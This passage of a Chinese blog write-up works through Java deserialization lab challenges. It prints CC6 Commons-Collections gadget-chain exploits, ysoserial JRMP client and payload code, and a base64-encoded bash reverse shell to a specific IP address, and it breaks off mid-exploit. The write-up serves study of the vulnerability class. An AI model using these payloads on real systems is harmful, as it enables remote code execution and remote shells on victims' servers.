&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTYxNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">				setFiled(calc, <span class="string">&quot;canPopCalc&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        System.out.println(Utils.objectToHexString(calc));</span><br><span class="line"><span class="comment">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream out = null;</span></span><br><span class="line"><span class="comment">//        out = new ObjectOutputStream(byteArrayOutputStream);</span></span><br><span class="line"><span class="comment">//        out.writeObject(calc);</span></span><br><span class="line"><span class="comment">//        out.flush();</span></span><br><span class="line"><span class="comment">//        byte[] bytes = byteArrayOutputStream.toByteArray();</span></span><br><span class="line"><span class="comment">//        byteArrayOutputStream.close();</span></span><br><span class="line"><span class="comment">//        System.out.println(Utils.bytesTohexString(bytes));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line"><span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(bytes));</span></span><br><span class="line"><span class="comment">//        Calc c = (Calc) objectInputStream.readObject();</span></span><br><span class="line">        String data = <span class="string">&quot;aced0005737200096c6162312e43616c63aebcd66698cce75a0200025a000a63616e506f7043616c634c0003636d647400124c6a6176612f6c616e672f537472696e673b78700174000b636d64202f632063616c63&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>虽然可能只有我自己会犯这种错，这里有一个小tip，Calc的路径也就是package必须和题目给的是一样的，因为在反序列化的时候是根据包去找相应的类的，所有该软件包不存在就会导致找不到相应的类</p>
<p><img src="https://img-blog.csdnimg.cn/3642f38af44c4eb799815ee4fef04bb9.png" alt="Untitled"></p>
<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/f1c1f129d65c4bca8240d559e1b3639a.png" alt="Untitled"></p>
<h2 id="Lab2-Ysoserial"><a href="#Lab2-Ysoserial" class="headerlink" title="Lab2-Ysoserial"></a>Lab2-Ysoserial</h2><p><img src="https://img-blog.csdnimg.cn/8eccf8603ceb45ceb63101375c1c63bc.png" alt="Untitled"></p>
<p>存在Commons-Collections-3.2.1依赖</p>
<p>反序列化里存在一定条件<code>name.equals(&quot;SJTU&quot;) &amp;&amp; year == 1896</code> ，所以导致不能直接利用工具生成payload，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line">publicclass IndexController &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required =true)</span> String data, Model model)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">    InputStream inputStream =<span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">    ObjectInputStream objectInputStream =<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">    String name = objectInputStream.readUTF();</span><br><span class="line"><span class="keyword">int</span> year = objectInputStream.readInt();</span><br><span class="line"><span class="keyword">if</span> (name.equals(<span class="string">&quot;SJTU&quot;</span>) &amp;&amp; year == <span class="number">1896</span>)</span><br><span class="line">      objectInputStream.readObject();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用通用的CC6，还没试过其他的链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers1 = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTYxNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain, transformers1);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">1896</span>);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/f7326c2d3fda4a40a28c460fad322b1f.png" alt="Untitled"></p>
<h2 id="Lab3-shiro-jrmp"><a href="#Lab3-shiro-jrmp" class="headerlink" title="Lab3-shiro-jrmp"></a>Lab3-shiro-jrmp</h2><h3 id="知识点-JRMP"><a href="#知识点-JRMP" class="headerlink" title="知识点 - JRMP"></a>知识点 - JRMP</h3><p>JRMP协议(Java Remote Message Protocol)：RMI专用的Java远程消息交换协议。</p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">Java JRMP - zpchcbd - 博客园 (cnblogs.com)</a></p>
<p><img src="https://img-blog.csdnimg.cn/e030d04a4eaf4aa6b3684037467e7115.png" alt="Untitled"></p>
<p>光看着，有点不能全部理解。直接看yso里面的payload吧</p>
<h3 id="Payload-JRMPListener"><a href="#Payload-JRMPListener" class="headerlink" title="Payload/JRMPListener"></a>Payload/JRMPListener</h3><p><code>JRMPListener</code> 端口为我们自定义,因为<code>UnicastRemoteObject</code> 的构造方法都是protected修饰的，所以要利用反射进行实例化并将属性port的值设为我们写入的端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPListener</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRemoteObject</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRemoteObject <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jrmpPort = Integer.parseInt(command);</span><br><span class="line">        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="keyword">new</span> UnicastServerRef(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">        <span class="keyword">return</span> uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接执行<code>PayloadRunner.run(JRMPListener.class, args);</code> 之后发现在反序列化之后会一直处于运行状态，可以调试跟一下</p>
<p>因为是对<code>UnicastRemoteObject</code>类进行序列化，所以在反序列化的时候就会调用到<code>UnicastRemoteObject#readObject</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进到<code>reexport</code> &gt;&gt; <code>exportObject(Remote obj, int port)</code> &gt;&gt; *<code>exportObject*(obj, new UnicastServerRef(port))</code> ，其中port为我们设置的端口</p>
<p>而在实例化<code>UnicastServerRef</code> 类的时候会将开服务的host和port传给LiveRef并生成对象的唯一标识符</p>
<p>在之后设置obj的ref为sref，其中包括了LiveRef这个类的信息</p>
<p><img src="https://img-blog.csdnimg.cn/65c6c3f15323423782b4bf9c2ded7ef8.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后再跟到了<code>UnicastServerRef#exportObject</code> ，之后其实就是走了一遍通过反射去实例化<code>UnicastRemoteObject</code>  并设置<code>Skeleton</code> 和<code>stub</code> ，在后续跟进到LiveRef的listen创建ServerSocket，从而开启rmi服务</p>
<p><img src="https://img-blog.csdnimg.cn/d9373ca2169842b69da7a6c61f7ad45e.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/573e06d0351c440eb43a65d0310a922d.png" alt="Untitled"></p>
<h3 id="Exp-JRMPClient"><a href="#Exp-JRMPClient" class="headerlink" title="Exp/JRMPClient"></a>Exp/JRMPClient</h3><blockquote>
<ul>
<li>targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>not deserializing anything (so you don’t get yourself exploited ;))</li>
</ul>
</blockquote>
<p>这个攻击方式的目标是远程的DGC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">            System.err.println(JRMPClient.class.getName() + <span class="string">&quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object payloadObject = Utils.makePayloadObject(args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">        String hostname = args[ <span class="number">0</span> ];</span><br><span class="line">        <span class="keyword">int</span> port = Integer.parseInt(args[ <span class="number">1</span> ]);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.err.println(String.format(<span class="string">&quot;* Opening JRMP socket %s:%d&quot;</span>, hostname, port));</span><br><span class="line">            makeDGCCall(hostname, port, payloadObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[<span class="number">2</span>], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的利用方法是：</p>
<p>传入的参数为开启RMI服务的host和port以及我们用于攻击的Gadget，会先对该服务进行连接，然后将Gadget序列化传到远程的RMI服务，因为在前面<a href="https://ameuu.github.io/2022/04/13/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A2/">Java学习笔记Ⅲ</a>中有讲到过，RMI服务之间传输数据的时候都是以序列化数据流传输的，所以我们序列化之后的Gadget被传进去的时候，会被远程服务反序列化从而产生RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeDGCCall</span> <span class="params">( String hostname, <span class="keyword">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException </span>&#123;</span><br><span class="line">    InetSocketAddress isa = <span class="keyword">new</span> InetSocketAddress(hostname, port);</span><br><span class="line">    Socket s = <span class="keyword">null</span>;</span><br><span class="line">    DataOutputStream dos = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">        s.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">        s.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream os = s.getOutputStream();</span><br><span class="line">        dos = <span class="keyword">new</span> DataOutputStream(os);</span><br><span class="line"></span><br><span class="line">        dos.writeInt(TransportConstants.Magic);</span><br><span class="line">        dos.writeShort(TransportConstants.Version);</span><br><span class="line">        dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">        dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line"></span><br><span class="line">        objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">        objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">        objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">        objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">        objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dos != <span class="keyword">null</span> ) &#123;</span><br><span class="line">            dos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( s != <span class="keyword">null</span> ) &#123;</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exp-JRMPListener"><a href="#Exp-JRMPListener" class="headerlink" title="Exp/JRMPListener"></a>Exp/JRMPListener</h3><h3 id="Payload-JRMPClient"><a href="#Payload-JRMPClient" class="headerlink" title="Payload/JRMPClient"></a>Payload/JRMPClient</h3><p><code>ObjID</code>  用于生成类的唯一标识，<code>TCPEndpoint</code>  则用来记录远程服务以便连接，有些不能理解的就是为什么要用动态代理来实现<code>Registry</code> 然后再进行反序列化，因为反序列化的时候好像耶并没有用到<code>Regstry</code> （感觉可能这是RMI的知识？</p>
<p>额……，把payload直接换成序列化<code>RemoteObjectInvocationHandler</code> 也执行成功了</p>
<p>Gadget：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RemoteObjectInvocationHandler#readObject</span><br><span class="line">	UnicastRef#readExternal</span><br><span class="line">		LiveRef#read</span><br><span class="line">			DGCClient#registerRefs</span><br><span class="line">				DGCClient#registerRefs(List&lt;LiveRef&gt; var1)</span><br><span class="line">						DGCClient#makeDirtyCall</span><br><span class="line">							DGCImpl_Stub#dirty</span><br><span class="line">									UnicastRef#newCall</span><br><span class="line">										UnicastRef#invoke</span><br><span class="line">												StreamRemoteCall#executeCall#<span class="keyword">this</span>.in.readObject()</span><br></pre></td></tr></table></figure>

<p>主要代码块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在vps利用yso开启JRMP监听，利用CC6的链子，命令为<code>calc</code></p>
<p><a href="https://xz.aliyun.com/t/2650#toc-5">ysoserial JRMP相关模块分析（二）- payloads/JRMPClient &amp; exploit/JRMPListener - 先知社区 (aliyun.com)</a></p>
<p>开始调试</p>
<p>因为动态代理中用到的是<code>RemoteObjectInvocationHandler</code> ，因此在反序列化的时候就会调用到<code>RemoteObjectInvocationHandler#readObject</code> 但是这个类没有，就会调用到其父类的<code>readObject</code> ，而用到的<code>UnicastRef</code> 在这里就直接调用到了</p>
<p><img src="https://img-blog.csdnimg.cn/ceb185123bda403aa6b1e091f5bb1485.png" alt="Untitled"></p>
<p>跟进<code>UnicastRef#readExternal</code> &gt;&gt; <code>LiveRef#read</code></p>
<p><img src="https://img-blog.csdnimg.cn/2ec13160f2bd426cbdefc341923ff00a.png" alt="Untitled"></p>
<p>而<code>LiveRef</code>中必须有的值都已经传进去了</p>
<p><img src="https://img-blog.csdnimg.cn/fc41c7fb644c47129826072bed721ec8.png" alt="Untitled"></p>
<p>最终是来到了<code>DGCClient</code> 这个类，并且将远程开启服务的host以及port传给了DGC，而通过lookup来找到特定的对象</p>
<p><img src="https://img-blog.csdnimg.cn/f89479a732e2491a9793eed8304d226c.png" alt="Untitled"></p>
<p>之后继续跟进，顺序如之前的gadget，在最后调用到了<code>StreamRemoteCall#executeCall</code>，将远程发送过来的序列化之后的字节码进行反序列化从而实现RCE</p>
<p><img src="https://img-blog.csdnimg.cn/914357b0e1824ebe8b9bd088ba94db27.png" alt="Untitled"></p>
<h3 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h3><p><img src="https://img-blog.csdnimg.cn/67e3e274ae384df89737107c83bd7c32.png" alt="Untitled"></p>
<p>这次依赖没有变，但是反序列化用的类是题目给出的。</p>
<p>而这里要点就是resolveClass进行了修改，利用了<code>loadClass</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(inputStream);</span><br><span class="line">    URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line"><span class="keyword">this</span>.classLoader =<span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; clazz =<span class="keyword">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line"><span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以去原<code>ObjectInputStream</code> 类中可以看到原来的<code>resolveClass</code> 中是利用了<code>forName</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>,latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl =primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在前面学shiro的时候可以发现如果是加载器的loadClass的时候如果反序列化流中包含非java自身的数组就会出现无法加载类的错误，而原类的forName就不会这样</p>
<p><img src="https://img-blog.csdnimg.cn/c39b3347f2454e808ee2a9a482a526eb.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    System.out.println(Class.forName(transformers.getClass().getName()));</span><br><span class="line"></span><br><span class="line">    URL[] urls = ((URLClassLoader) Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">    Index index = <span class="keyword">new</span> Index();</span><br><span class="line">    index.classLoader =<span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line"></span><br><span class="line">    System.out.println(index.classLoader.loadClass(transformers.getClass().getName()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class [Lorg.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="comment">// Exception in thread &quot;main&quot; java.lang.ClassNotFoundException: [Lorg.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="comment">//	at java.net.URLClassLoader.findClass(URLClassLoader.java:381)</span></span><br><span class="line"><span class="comment">//	at java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span></span><br><span class="line"><span class="comment">//	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span></span><br><span class="line"><span class="comment">//	at lab3.Index.main(Index.java:30)</span></span><br></pre></td></tr></table></figure>

<p>可以利用JRMP打，这里利用第二种方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span 